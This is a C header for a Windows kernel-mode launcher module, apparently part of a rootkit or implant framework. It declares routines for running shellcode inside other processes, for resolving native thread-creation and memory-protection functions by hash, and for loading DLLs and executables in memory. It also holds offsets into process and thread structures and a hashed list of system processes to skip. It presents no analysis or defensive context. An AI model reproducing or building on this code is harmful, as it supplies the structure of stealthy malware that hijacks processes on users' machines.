#ifndef __MOD_LAUNCHERAPI_H_
#define __MOD_LAUNCHERAPI_H_

typedef VOID (*Fnlauncher_create_process_notifier)(IN HANDLE ParentId, IN HANDLE ProcessId, IN BOOLEAN Create);

#include "../../mod_shared/pack_protect.h"

#define MAX_PROCESS_NAME_LEN 15

#define EXCLUDE_COUNT 4// 6
#define EXCLUDE_PROC1 0x9432b6a6 // System
#define EXCLUDE_PROC2 0x59ca7a97 // smss.exe
#define EXCLUDE_PROC3 0xbb66d4a4 // wininit.exe
#define EXCLUDE_PROC4 0x59cae694 // lsass.exe
// #define EXCLUDE_PROC5 0x99cadd98 // csrss.exe
//#define EXCLUDE_PROC6 0x9aff1a23 // winlogon.exe

#define ZRUNTIME_FLAG_NEW 0x01
#define ZRUNTIME_FLAG_LOADED 0x02
#define ZRUNTIME_FLAG_UNLOAD 0x03
#define ZRUNTIME_FLAG_RELOAD 0x04
#define ZRUNTIME_FLAG_ZOMBI 0x05
#define ZRUNTIME_FLAG_ANY_PROCESS 0x80000000

typedef struct _zfile_list_entry
{
    LIST_ENTRY;
    uint32_t flags;
    uint8_t* fileBuffer;
    uint32_t bufferSize;
    CLIENT_ID threadClientId;
    char name[4 * ZFS_MAX_FILENAME];
    char processName[64];
    uint32_t processNameHash;
    PEPROCESS pEprocess;
    pvoid_t dllBase;
    uint32_t dllSize;
    ptask_t pTask;
    uint32_t runtimeState;
    uint32_t launchAttempts;
    uint8_t clientId[16];
} zfile_list_entry_t, *pzfile_list_entry_t;

typedef bool_t (*Fnexecmgr_process_pack_config)(uint8_t* configBuffer, uint32_t configSize);
typedef void (*Fnlauncher_process_config_entries)(pzautorun_config_entry_t pConfigBlock, uint32_t blocksCount, bool_t needLaunch);
typedef uint32_t (*Fnlauncher_execute_shellcode)(PEPROCESS pep, uint8_t* pSc, uint32_t scSize, uint8_t* inData, uint32_t inDataSize, uint8_t** pOutData, uint32_t* pOutDataSize, PLARGE_INTEGER pTimeOut, bool_t isNative);
typedef uint32_t (*Fnlauncher_process_zfile)(pzfile_list_entry_t pZfileEntry);

// #ifdef _WIN64
// 
// typedef struct _NTCREATETHREADEXBUFFER
// {
//     ulong_t  Size;
//     uintptr_t Unknown1;
//     uintptr_t Unknown2;
//     uintptr_t* Unknown3;
//     uintptr_t Unknown4;
// } NTCREATETHREADEXBUFFER;
// 
// 
// #else 

// Buffer argument passed to NtCreateThreadEx function
typedef struct _NTCREATETHREADEXBUFFER
{
    uintptr_t  Size;
    uintptr_t  Unknown1;
    uintptr_t  Unknown2;
    uintptr_t* Unknown3;
    uintptr_t  Unknown4;
    uintptr_t  Unknown5;
    uintptr_t  Unknown6;
    uintptr_t* Unknown7;
    uintptr_t  Unknown8;
    //uintptr_t reserved[16];
} NTCREATETHREADEXBUFFER;

//#endif // _WIN64

#define NtCreateThreadEx_Hash 0xA39D295A
typedef NTSTATUS (*FnNtCreateThreadEx)(void**, ulong_t, void*, void*, void*, void*, ulong_t, size_t, size_t, size_t, void*);

#define NtCreateThread_Hash 0x38A6BF4A
typedef NTSTATUS (*FnNtCreateThread)(OUT PHANDLE ThreadHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN HANDLE ProcessHandle, OUT PCLIENT_ID ClientId, IN PCONTEXT ThreadContext, IN PINITIAL_TEB InitialTeb, IN BOOLEAN CreateSuspended);

#define NtResumeThread_Hash 0xF83ADACB
typedef NTSTATUS (*FnNtResumeThread)(IN HANDLE ThreadHandle, OUT PULONG SuspendCount OPTIONAL);

#define NtProtectVirtualMemory_Hash 0x06E72E44
typedef NTSTATUS (*FnNtProtectVirtualMemory)(IN HANDLE ProcessHandle, IN OUT PVOID *BaseAddress, IN OUT size_t* /*PULONG*/ NumberOfBytesToProtect, IN ULONG NewAccessProtection, OUT PULONG OldAccessProtection);


typedef pvoid_t (*Fnlauncher_find_func_in_service_table)(uint32_t funcHash);
typedef PEPROCESS (*Fnlauncher_find_user_thread_by_hash)(uint32_t hashVal, PEPROCESS pep, PETHREAD* pet);

typedef void (*Fnlauncher_add_zfile_clone_for_process)(pzfile_list_entry_t pZfileEntry, PEPROCESS pep, uint32_t nameHash);
typedef uint8_t* (*Fnlauncher_load_file)(const char* name, uint32_t nameSize, uint32_t* pSize);
typedef uint8_t* (*Fnlauncher_load_config)(uint32_t* pSize, pzfs_file_t* ppFile, uint8_t mode);
typedef void (*Fnlauncher_save_config)(pzfs_file_t pFile, uint8_t* pBuffer, uint32_t size);

// typedef VOID (*Fnapc_kernel_routine)(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, pvoid_t* NormalContext, pvoid_t* SystemArgument1, pvoid_t* SystemArgument2);

typedef void (*Fnlauncher_define_overlord_zfile)(char* name, pzfile_list_entry_t pZfileEntry);

typedef void (*Fnlauncher_stage1_init)();
typedef void (*Fnlauncher_shutdown_routine)();
typedef bool_t (*Fnlauncher_process_bundle)(pbundle_header_t pBundleHeader, uint8_t* pSha1Hash, bool_t saveOnly);
typedef void (*Fnlauncher_process_modules)();
typedef void (*Fnlauncher_autostart_modules)();

typedef bool_t (*Fnlauncher_overlord_request)(overlord_request_id_e orid, uint8_t* inData, uint32_t inSize, uint8_t** pOutData, uint32_t* pOutSize);

typedef struct _file_hash_entry
{
    uint32_t hashVal;
    uint8_t* fileBuffer;
    uint32_t fileSize;
} file_hash_entry_t, *pfile_hash_entry_t;

typedef struct _mod_launcher_private
{
    Fnlauncher_find_func_in_service_table fnlauncher_find_func_in_service_table;
    FnNtCreateThreadEx fnNtCreateThreadEx;
    FnNtCreateThread fnNtCreateThread;
    FnNtResumeThread fnNtResumeThread;
    FnNtProtectVirtualMemory fnNtProtectVirtualMemory;
    Fnlauncher_add_zfile_clone_for_process fnlauncher_add_zfile_clone_for_process;
    Fnlauncher_load_file fnlauncher_load_file;
    Fnlauncher_load_config fnlauncher_load_config;
    Fnlauncher_save_config fnlauncher_save_config;

//     Fnapc_kernel_routine fnapc_kernel_routine;
    Fnlauncher_define_overlord_zfile fnlauncher_define_overlord_zfile;
    Fnlauncher_create_process_notifier fnlauncher_create_process_notifier;

    Fnlauncher_process_config_entries fnlauncher_process_config_entries;
    Fnlauncher_process_zfile fnlauncher_process_zfile;

#ifdef _WIN64
    uint8_t* scOverlord64;
    uint8_t* scDllMem64;
    uint8_t* scTransitLauncher64;
    uint8_t* scNtDLLFinder64;
    uint8_t* scExportFinder64;
#endif // _WIN64
    uint8_t* scOverlord32;
    uint8_t* scExeDisk32;
    uint8_t* scExeMem32;
    uint8_t* scDllMem32;
    uint8_t* scTransitLauncher32;
    uint8_t* scNtDLLFinder32;
    uint8_t* scExportFinder32;

    uint8_t* pModBase;

    uint8_t* ntdllBase;
    uint32_t ntdllSize;

    uint32_t scOverlordSize;

//    uint32_t dwPID;
    uint32_t dwImageFileName;
    uint32_t dwActiveProcessLinks;
//    uint32_t dwUniqueProcessId;
    uint32_t dwThreadListHead;
    uint32_t dwThreadListEntry;
    uint32_t dwThreadState;
    uint32_t dwWin32StartAddress;
    uint32_t dwWaitReason;
    uint32_t dwPeb;
    uint32_t dwLdr;
    uint32_t dwInMemoryOrderModuleList;
    uint32_t dwDllBase;
    uint32_t dwFullDllName;
    uint32_t dwApcQueueable;
    uint32_t dwAlertable;
    uint8_t dbAlertableMask;

    uint32_t excludeProcesses[EXCLUDE_COUNT];

    zfile_list_entry_t baseListHead;
    zfile_list_entry_t runningListHead;
    KSPIN_LOCK slRunningList;
    KSPIN_LOCK slBaseList;

    uint32_t configUnixTime;

    pfile_hash_entry_t pFilesHashTable;
} mod_launcher_private_t, *pmod_launcher_private_t;

typedef struct _mod_launcher_block
{
    Fnlauncher_stage1_init fnlauncher_stage1_init;
    Fnlauncher_shutdown_routine fnlauncher_shutdown_routine;
    Fnlauncher_find_user_thread_by_hash fnlauncher_find_user_thread_by_hash;

    Fnlauncher_process_bundle fnlauncher_process_bundle;
    Fnlauncher_process_modules fnlauncher_process_modules;
    Fnlauncher_execute_shellcode fnlauncher_execute_shellcode;
    Fnlauncher_autostart_modules fnlauncher_autostart_modules;
    Fnlauncher_overlord_request fnlauncher_overlord_request;

    uint32_t modulesPending;

    pzfile_list_entry_t pOverlordZfileEntry;

    mod_launcher_private_t;
} mod_launcher_block_t, *pmod_launcher_block_t;

#endif // __MOD_LAUNCHERAPI_H_
